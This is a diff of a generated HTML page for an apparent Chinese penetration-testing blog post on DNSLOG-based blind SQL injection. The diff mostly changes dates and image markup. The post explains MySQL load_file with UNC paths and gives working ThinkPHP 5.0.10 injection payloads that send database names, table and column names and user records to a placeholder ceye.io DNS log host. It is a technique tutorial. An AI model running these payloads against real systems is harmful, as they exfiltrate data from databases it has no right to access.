@@ -236,7 +236,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/25/利用DNSLOG快速获取数据(盲注)/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/26/利用DNSLOG快速获取数据(盲注)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="P0rZ9">
@@ -255,7 +255,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/09/25/利用DNSLOG快速获取数据(盲注)/" itemprop="url">渗透技巧 |  利用DNSLOG快速获取数据(盲注)</a></h1>
+                <a class="post-title-link" href="/2018/09/26/利用DNSLOG快速获取数据(盲注)/" itemprop="url">渗透技巧 |  利用DNSLOG快速获取数据(盲注)</a></h1>
         
 
         <div class="post-meta">
@@ -267,8 +267,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-25T09:26:41+08:00">
-                2018-09-25
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-26T09:26:41+08:00">
+                2018-09-26
               </time>
             
 
@@ -315,16 +315,16 @@
 <blockquote>
 <p><strong>LOAD_FILE(file_name)</strong><br>读取文件并返回文件内容为字符串。要使用此函数,文件必须位于服务器主机上,必须指定完整路径的文件,而且必须有FILE权限。<br>该文件所有字节可读,但文件内容必须小于<strong>max_allowed_packet</strong>。 如果该文件不存在或无法读取,因为前面的条件之一不满足,函数返回<br>NULL。 在MySQL 5.0.19,<strong>character_set_filesystem</strong>系统变量控制文件名的解释,即仅作文字字符串。</p>
 </blockquote>
-<p>读取文件:<br>![image_1co8h76to15971pu6akagogf4k19.png-16.7kB][1]</p>
-<p>实际上<code>load_file()</code>函数还可以用来发送dns解析请求<br>![image_1co8poe7gcta1tov1vfl19tgsrt6i.png-24.3kB][2]</p>
+<p>读取文件:<br><img src="http://static.zybuluo.com/chhyx/uwgzjrbxxkbuqhfv1w6u7xcy/image_1co8h76to15971pu6akagogf4k19.png" alt="image_1co8h76to15971pu6akagogf4k19.png-16.7kB"></p>
+<p>实际上<code>load_file()</code>函数还可以用来发送dns解析请求<br><img src="http://static.zybuluo.com/chhyx/3z50i936q7geyodeq99buky1/image_1co8poe7gcta1tov1vfl19tgsrt6i.png" alt="image_1co8poe7gcta1tov1vfl19tgsrt6i.png-24.3kB"></p>
 <p>而这就是dns注入的<strong>关键</strong></p>
 <p>2.存在局限:<br>A.<code>load_file</code>函数在<code>Linux</code>下是无法用来做<code>dnslog</code>攻击的，因为在这里就涉及到<code>Windows</code>的一个小Tips——<code>UNC路径</code>,我们看下UNC在百度上的解释:</p>
-<p>![image_1co9pm7mstkmdbr1fbp1l9155s69.png-48.1kB][3]</p>
+<p><img src="http://static.zybuluo.com/chhyx/k3kx7dz4o3yyg4wr2famxmbl/image_1co9pm7mstkmdbr1fbp1l9155s69.png" alt="image_1co9pm7mstkmdbr1fbp1l9155s69.png-48.1kB"></p>
 <p>sql语句:</p>
 <pre><code>select load_file(&apos;\\\\test.xxxx.ceye.io\\abc&apos;);
 </code></pre><p>这就解释了为什么在mysql中运行<code>concat()</code>函数拼接了4个<code>\</code>了,因为转义 4个<code>\</code>变成了2个<code>\</code>,目的就是利用UNC路径。因为Linux没有UNC路径这个东西 所以不能使用这种方式外带数据</p>
-<p>B.MySQL数据库配置中要设置<code>secure_file_priv</code>为空,才能完整的去请求<code>DNS</code><br>在<code>mysql.ini</code>设置:<br>![image_1co9nblsueuq13uj1lce183d0b13.png-45.3kB][5]</p>
-<p>查看设置:<br>![image_1co9n8b6h1f821uc6lg0vokai19.png-11.8kB][4]</p>
+<p>B.MySQL数据库配置中要设置<code>secure_file_priv</code>为空,才能完整的去请求<code>DNS</code><br>在<code>mysql.ini</code>设置:<br><img src="http://static.zybuluo.com/chhyx/bdr8rjiu9seakpet2dgceqr6/image_1co9nblsueuq13uj1lce183d0b13.png" alt="image_1co9nblsueuq13uj1lce183d0b13.png-45.3kB"></p>
+<p>查看设置:<br><img src="http://static.zybuluo.com/chhyx/g70wz91gxlp9ogusj8n5zc8z/image_1co9n8b6h1f821uc6lg0vokai19.png" alt="image_1co9n8b6h1f821uc6lg0vokai19.png-11.8kB"></p>
 <pre><code>当secure_file_priv为空，就可以读取磁盘的目录。
 当secure_file_priv为G:\，就可以读取G盘的文件。
 当secure_file_priv为null，load_file就不能加载文件。
@@ -336,8 +336,8 @@ d.域名前缀不支持一些特殊字符,如*,解决办法是用hex()或者其�
 e.sqlmap也提供了这种注入方法,参数：`–dns-domain`
 </code></pre><p>4.实战:<br>咱们以笔者昨天分析的TP5.0.10的一处盲注为例子,具体看<br>A.获取数据库名:<br>payload:</p>
 <pre><code>user[0]=EXISTS&amp;user[1]=select * from user where if((select load_file(concat(&apos;\\\\\\\\&apos;,(select hex(database())),&apos;.xxxx.ceye.io\\abc&apos;))),1,1)
-</code></pre><p>![image_1co9r9jap1s8m1t0c1bf81cq2ghk7g.png-48.7kB][6]</p>
-<p>dnslog平台收到:<br>![image_1co9r8lts151317bj124o1coec0673.png-17.6kB][7]</p>
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/qylgxwd143p8unipijf5iwaa/image_1co9r9jap1s8m1t0c1bf81cq2ghk7g.png" alt="image_1co9r9jap1s8m1t0c1bf81cq2ghk7g.png-48.7kB"></p>
+<p>dnslog平台收到:<br><img src="http://static.zybuluo.com/chhyx/8h5103qsd2tpj5h285at60yo/image_1co9r8lts151317bj124o1coec0673.png" alt="image_1co9r8lts151317bj124o1coec0673.png-17.6kB"></p>
 <p>paylaod解释:</p>
 <pre><code>concat 将字符串拼接
 database()  数据库查询语句
@@ -346,16 +346,16 @@ hex()   hex加密 防止数据库有特殊字符传不出来
 这里拼接起来是:load_file(&apos;\\\\\\\\ tp.xxxx.ceye.io\\abc&apos;),相当于访问了带有数据库名称的三级域名,被dns捕捉到了
 </code></pre><p>B.获取表信息:<br>payload:</p>
 <pre><code>user[0]=EXISTS&amp;user[1]=select * from user where if((select load_file(concat(&apos;\\\\\\\\&apos;,(select table_name from information_schema.tables where table_schema=&apos;tp&apos; limit 0,1),&apos;.xxxx.ceye.io\\abc&apos;))),1,1)
-</code></pre><p>通过改变limit 0,1来一个一个解析(limit 1,1、limit 2,1)<br>第一张表:<br>![image_1co8lqvgd1k87all4a8a5f18302g.png-15.1kB][8]</p>
-<p>第二张表:<br>![image_1co8lt5hbua1v5m18dc1hbd5dt2t.png-14.5kB][9]</p>
+</code></pre><p>通过改变limit 0,1来一个一个解析(limit 1,1、limit 2,1)<br>第一张表:<br><img src="http://static.zybuluo.com/chhyx/1ha3t6253yavexd5sm7ob31t/image_1co8lqvgd1k87all4a8a5f18302g.png" alt="image_1co8lqvgd1k87all4a8a5f18302g.png-15.1kB"></p>
+<p>第二张表:<br><img src="http://static.zybuluo.com/chhyx/c1948vsz89c04qyzla4uzzg0/image_1co8lt5hbua1v5m18dc1hbd5dt2t.png" alt="image_1co8lt5hbua1v5m18dc1hbd5dt2t.png-14.5kB"></p>
 <p>C:获取<code>gather</code>表内的字段名:</p>
 <pre><code>user[0]=EXISTS&amp;user[1]=select * from user where if((select load_file(concat(&apos;\\\\\\\\&apos;,(select column_name from information_schema.columns where table_name = &apos;gather&apos; limit 1,1),&apos;.xxxx.ceye.io\\abc&apos;))),1,1)
-</code></pre><p>![image_1co8mbnnc1iupko85c51cvu1k8e3n.png-6.4kB][10]<br>![image_1co8mb1376kg3o2mv19fj1gr73a.png-6.5kB][11]<br>![image_1co8mcsk61b1ur6o11j1nervde44.png-6kB][12]</p>
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/hm6avbqq4034mn0v9tqxlkgk/image_1co8mbnnc1iupko85c51cvu1k8e3n.png" alt="image_1co8mbnnc1iupko85c51cvu1k8e3n.png-6.4kB"><br><img src="http://static.zybuluo.com/chhyx/167hww2kvi3mwsabu0o90z2r/image_1co8mb1376kg3o2mv19fj1gr73a.png" alt="image_1co8mb1376kg3o2mv19fj1gr73a.png-6.5kB"><br><img src="http://static.zybuluo.com/chhyx/gt3mzhhv7vqb99s298bv3feu/image_1co8mcsk61b1ur6o11j1nervde44.png" alt="image_1co8mcsk61b1ur6o11j1nervde44.png-6kB"></p>
 <p>D.获取3个字段的的数据:</p>
 <pre><code>user[0]=EXISTS&amp;user[1]=select * from user where if((select load_file(concat(&apos;\\\\\\\\&apos;,(select username from gather limit 0,1),&apos;.xxxx.ceye.io\\abc&apos;))),1,1)  //username gather_waf id
-</code></pre><p>![image_1co8pd457cnc15tmhm1o7g13h85b.png-6kB][13]<br>![image_1co8pbp53ra3qv81qtu18u0ou84u.png-6.8kB][14]<br>![image_1co8pf4hsouq167e1pdsi6qa705o.png-5.7kB][15]</p>
-<p>![image_1co8pfq2417i88stpo21m5794665.png-10.2kB][16]</p>
-<p>相比于通过猜解获取信息,用dnslog算是挺高效的。虽然利用条件不算宽松,但是技巧还是值得学习的。<br>  [1]: <a href="http://static.zybuluo.com/chhyx/uwgzjrbxxkbuqhfv1w6u7xcy/image_1co8h76to15971pu6akagogf4k19.png" target="_blank" rel="noopener">http://static.zybuluo.com/chhyx/uwgzjrbxxkbuqhfv1w6u7xcy/image_1co8h76to15971pu6akagogf4k19.png</a><br>  [2]: <a href="http://static.zybuluo.com/chhyx/3z50i936q7geyodeq99buky1/image_1co8poe7gcta1tov1vfl19tgsrt6i.png" target="_blank" rel="noopener">http://static.zybuluo.com/chhyx/3z50i936q7geyodeq99buky1/image_1co8poe7gcta1tov1vfl19tgsrt6i.png</a><br>  [3]: <a href="http://static.zybuluo.com/chhyx/k3kx7dz4o3yyg4wr2famxmbl/image_1co9pm7mstkmdbr1fbp1l9155s69.png" target="_blank" rel="noopener">http://static.zybuluo.com/chhyx/k3kx7dz4o3yyg4wr2famxmbl/image_1co9pm7mstkmdbr1fbp1l9155s69.png</a><br>  [4]: <a href="http://static.zybuluo.com/chhyx/g70wz91gxlp9ogusj8n5zc8z/image_1co9n8b6h1f821uc6lg0vokai19.png" target="_blank" rel="noopener">http://static.zybuluo.com/chhyx/g70wz91gxlp9ogusj8n5zc8z/image_1co9n8b6h1f821uc6lg0vokai19.png</a><br>  [5]: <a href="http://static.zybuluo.com/chhyx/bdr8rjiu9seakpet2dgceqr6/image_1co9nblsueuq13uj1lce183d0b13.png" target="_blank" rel="noopener">http://static.zybuluo.com/chhyx/bdr8rjiu9seakpet2dgceqr6/image_1co9nblsueuq13uj1lce183d0b13.png</a><br>  [6]: <a href="http://static.zybuluo.com/chhyx/qylgxwd143p8unipijf5iwaa/image_1co9r9jap1s8m1t0c1bf81cq2ghk7g.png" target="_blank" rel="noopener">http://static.zybuluo.com/chhyx/qylgxwd143p8unipijf5iwaa/image_1co9r9jap1s8m1t0c1bf81cq2ghk7g.png</a><br>  [7]: <a href="http://static.zybuluo.com/chhyx/8h5103qsd2tpj5h285at60yo/image_1co9r8lts151317bj124o1coec0673.png" target="_blank" rel="noopener">http://static.zybuluo.com/chhyx/8h5103qsd2tpj5h285at60yo/image_1co9r8lts151317bj124o1coec0673.png</a><br>  [8]: <a href="http://static.zybuluo.com/chhyx/1ha3t6253yavexd5sm7ob31t/image_1co8lqvgd1k87all4a8a5f18302g.png" target="_blank" rel="noopener">http://static.zybuluo.com/chhyx/1ha3t6253yavexd5sm7ob31t/image_1co8lqvgd1k87all4a8a5f18302g.png</a><br>  [9]: <a href="http://static.zybuluo.com/chhyx/c1948vsz89c04qyzla4uzzg0/image_1co8lt5hbua1v5m18dc1hbd5dt2t.png" target="_blank" rel="noopener">http://static.zybuluo.com/chhyx/c1948vsz89c04qyzla4uzzg0/image_1co8lt5hbua1v5m18dc1hbd5dt2t.png</a><br>  [10]: <a href="http://static.zybuluo.com/chhyx/hm6avbqq4034mn0v9tqxlkgk/image_1co8mbnnc1iupko85c51cvu1k8e3n.png" target="_blank" rel="noopener">http://static.zybuluo.com/chhyx/hm6avbqq4034mn0v9tqxlkgk/image_1co8mbnnc1iupko85c51cvu1k8e3n.png</a><br>  [11]: <a href="http://static.zybuluo.com/chhyx/167hww2kvi3mwsabu0o90z2r/image_1co8mb1376kg3o2mv19fj1gr73a.png" target="_blank" rel="noopener">http://static.zybuluo.com/chhyx/167hww2kvi3mwsabu0o90z2r/image_1co8mb1376kg3o2mv19fj1gr73a.png</a><br>  [12]: <a href="http://static.zybuluo.com/chhyx/gt3mzhhv7vqb99s298bv3feu/image_1co8mcsk61b1ur6o11j1nervde44.png" target="_blank" rel="noopener">http://static.zybuluo.com/chhyx/gt3mzhhv7vqb99s298bv3feu/image_1co8mcsk61b1ur6o11j1nervde44.png</a><br>  [13]: <a href="http://static.zybuluo.com/chhyx/dt558yb8dyxzlcctnbwos9j1/image_1co8pd457cnc15tmhm1o7g13h85b.png" target="_blank" rel="noopener">http://static.zybuluo.com/chhyx/dt558yb8dyxzlcctnbwos9j1/image_1co8pd457cnc15tmhm1o7g13h85b.png</a><br>  [14]: <a href="http://static.zybuluo.com/chhyx/pm64dlz4zw95k9grz83oj8xb/image_1co8pbp53ra3qv81qtu18u0ou84u.png" target="_blank" rel="noopener">http://static.zybuluo.com/chhyx/pm64dlz4zw95k9grz83oj8xb/image_1co8pbp53ra3qv81qtu18u0ou84u.png</a><br>  [15]: <a href="http://static.zybuluo.com/chhyx/4zkcoqwoch8t9b57matnxrru/image_1co8pf4hsouq167e1pdsi6qa705o.png" target="_blank" rel="noopener">http://static.zybuluo.com/chhyx/4zkcoqwoch8t9b57matnxrru/image_1co8pf4hsouq167e1pdsi6qa705o.png</a><br>  [16]: <a href="http://static.zybuluo.com/chhyx/6n3qvx9jkec1utlw8r58qj2x/image_1co8pfq2417i88stpo21m5794665.png" target="_blank" rel="noopener">http://static.zybuluo.com/chhyx/6n3qvx9jkec1utlw8r58qj2x/image_1co8pfq2417i88stpo21m5794665.png</a></p>
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/dt558yb8dyxzlcctnbwos9j1/image_1co8pd457cnc15tmhm1o7g13h85b.png" alt="image_1co8pd457cnc15tmhm1o7g13h85b.png-6kB"><br><img src="http://static.zybuluo.com/chhyx/pm64dlz4zw95k9grz83oj8xb/image_1co8pbp53ra3qv81qtu18u0ou84u.png" alt="image_1co8pbp53ra3qv81qtu18u0ou84u.png-6.8kB"><br><img src="http://static.zybuluo.com/chhyx/4zkcoqwoch8t9b57matnxrru/image_1co8pf4hsouq167e1pdsi6qa705o.png" alt="image_1co8pf4hsouq167e1pdsi6qa705o.png-5.7kB"></p>
+<p><img src="http://static.zybuluo.com/chhyx/6n3qvx9jkec1utlw8r58qj2x/image_1co8pfq2417i88stpo21m5794665.png" alt="image_1co8pfq2417i88stpo21m5794665.png-10.2kB"></p>
+<p>相比于通过猜解获取信息,用dnslog算是挺高效的。虽然利用条件不算宽松,但是技巧还是值得学习的。 </p>
 
           
         
